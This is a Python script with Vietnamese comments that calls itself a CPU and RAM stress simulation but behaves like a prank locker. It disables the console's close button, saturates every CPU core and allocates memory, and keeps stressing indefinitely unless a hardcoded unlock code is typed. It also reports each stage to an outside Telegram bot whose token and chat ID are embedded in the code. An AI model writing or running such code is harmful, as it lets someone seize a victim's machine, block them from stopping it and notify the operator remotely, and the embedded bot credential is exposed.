import time
import multiprocessing
import urllib.request
import urllib.parse
import json
import threading
import sys
import os
import ctypes

# ----------------- CẤU HÌNH CODE DỪNG -----------------
UNLOCK_CODE = "123456"  # Bạn có thể thay đổi code tại đây
# --------------------------------------------------------

def disable_close_button():
    try:
        if os.name == 'nt':
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                hMenu = ctypes.windll.user32.GetSystemMenu(hwnd, False)
                if hMenu:
                    ctypes.windll.user32.RemoveMenu(hMenu, 0xF060, 0x0000) # SC_CLOSE
    except:
        pass

def enable_close_button():
    try:
        if os.name == 'nt':
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                ctypes.windll.user32.GetSystemMenu(hwnd, True) # Khôi phục menu
    except:
        pass

def send_telegram_message(message):
    bot_token = "5142290467:AAH8aHrW7GIyoZ5IGUCUZ3So5actekfmh0Q"
    chat_id = "2047641647" # Chat ID đã được bổ sung
    
    if chat_id == "YOUR_CHAT_ID_HERE":
        print("[-] Vui lòng điền chat_id của bạn vào hàm send_telegram_message!")
        return

    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = urllib.parse.urlencode({'chat_id': chat_id, 'text': message}).encode('utf-8')
        req = urllib.request.Request(url, data=data)
        with urllib.request.urlopen(req) as response:
            res = json.loads(response.read().decode())
    except Exception as e:
        print(f"[-] Lỗi khi gửi Telegram: {e}")

def cpu_ram_stress_task(pause_event, stop_event):
    """
    Tiến trình con mô phỏng tải CPU và RAM.
    """
    memory_hog = []
    while not stop_event.is_set():
        if pause_event.is_set():
            time.sleep(0.5)
            continue
            
        _ = 9999999 ** 2
        
        # Stress RAM: Tăng dần bộ nhớ chiếm dụng lên một mức hợp lý cho mỗi tiến trình
        # Cấp phát 1MB mỗi lần lặp, giới hạn tối đa 500MB cho mỗi luồng
        if len(memory_hog) < 500:
            memory_hog.append("A" * 1024 * 1024)

def input_thread_func(input_list):
    try:
        code = input("\n[?] Nhập code để tắt console: ")
        input_list.append(code.strip())
    except EOFError:
        pass
    except RuntimeError:
        pass

if __name__ == '__main__':
    disable_close_button()
    print("=== CHƯƠNG TRÌNH MÔ PHỎNG TẢI CPU VÀ RAM ===")
    
    pause_event = multiprocessing.Event()
    stop_event = multiprocessing.Event()
    num_cores = multiprocessing.cpu_count()
    
    start_msg = f"Hệ thống cấp phát {num_cores} luồng. Bắt đầu stress CPU & RAM trong 10 giây đầu..."
    print(start_msg)
    send_telegram_message(f"Bắt đầu CPU & RAM Stress: {start_msg}")
    
    processes = []
    for _ in range(num_cores):
        p = multiprocessing.Process(target=cpu_ram_stress_task, args=(pause_event, stop_event))
        processes.append(p)
        p.start()

    # 1. Stress 10 giây đầu tiên (ko cho nhập trong lúc này)
    start_time = time.time()
    while time.time() - start_time < 10:
        time.sleep(0.1)
        
    # 2. Tạm dừng 30 giây để nhập code
    pause_event.set()
    pause_msg = "\n[!] Đã stress xong 10 giây. Tạm dừng! Bạn có 30 giây để nhập code tắt console."
    print(pause_msg)
    send_telegram_message(pause_msg)
    
    input_list = []
    input_thread = threading.Thread(target=input_thread_func, args=(input_list,))
    input_thread.daemon = True
    input_thread.start()
    
    wait_start = time.time()
    code_entered = False
    
    while time.time() - wait_start < 30:
        if input_list:
            if input_list[0] == UNLOCK_CODE:
                success_msg = "\n[+] Code đúng! Đang dọn dẹp hệ thống..."
                print(success_msg)
                send_telegram_message(success_msg)
                code_entered = True
                stop_event.set()
                pause_event.clear()
                break
            else:
                print("\n[-] Code sai!")
                input_list.clear() # Đặt lại list để nhập lần nữa
                input_thread = threading.Thread(target=input_thread_func, args=(input_list,))
                input_thread.daemon = True
                input_thread.start()
        time.sleep(0.1)
        
    # 3. Quá 30 giây không đúng code thì tiếp tục stress vô hạn (kể từ 10s đầu)
    if not code_entered:
        resume_msg = "\n[-] Hết 30 giây! Tiếp tục stress CPU và RAM không giới hạn..."
        print(resume_msg)
        send_telegram_message(resume_msg)
        pause_event.clear() # Resume stress
        
        while not stop_event.is_set():
            if input_list and input_list[0] == UNLOCK_CODE:
                success_msg = "\n[+] Code đúng! Đang dọn dẹp hệ thống..."
                print(success_msg)
                send_telegram_message(success_msg)
                code_entered = True
                stop_event.set()
                break
            elif input_list:
                print("\n[-] Code sai!")
                input_list.clear()
                input_thread = threading.Thread(target=input_thread_func, args=(input_list,))
                input_thread.daemon = True
                input_thread.start()
            time.sleep(0.1)

    # Dọn dẹp
    for p in processes:
        p.join()

    enable_close_button()
    final_msg = "Hoàn tất dọn dẹp. Hệ thống đã an toàn và tài nguyên được giải phóng hoàn toàn."
    print(final_msg)
    send_telegram_message(final_msg)
